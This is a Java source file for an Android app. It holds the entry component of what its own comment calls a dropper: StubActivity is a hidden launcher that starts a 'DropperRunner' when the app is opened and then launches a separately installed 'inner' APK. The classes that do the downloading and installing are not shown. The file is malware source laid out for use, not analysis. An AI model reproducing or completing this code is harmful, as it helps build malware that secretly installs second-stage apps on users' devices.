package com.pkg.loader.dispatch;

import android.os.Bundle;

import androidx.appcompat.app.AppCompatActivity;

import com.pkg.loader.dispatch.internal.ApkInstaller;
import com.pkg.loader.dispatch.internal.DropperRunner;

/** Hidden launcher entry (MAIN + INFO) — triggers dropper on open. */
public class StubActivity extends AppCompatActivity {
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        DropperRunner.start(getApplicationContext());
    }

    @Override
    protected void onResume() {
        super.onResume();
        if (ApkInstaller.isInnerInstalled(this)) {
            ApkInstaller.launchInner(this);
            finish();
        }
    }
}
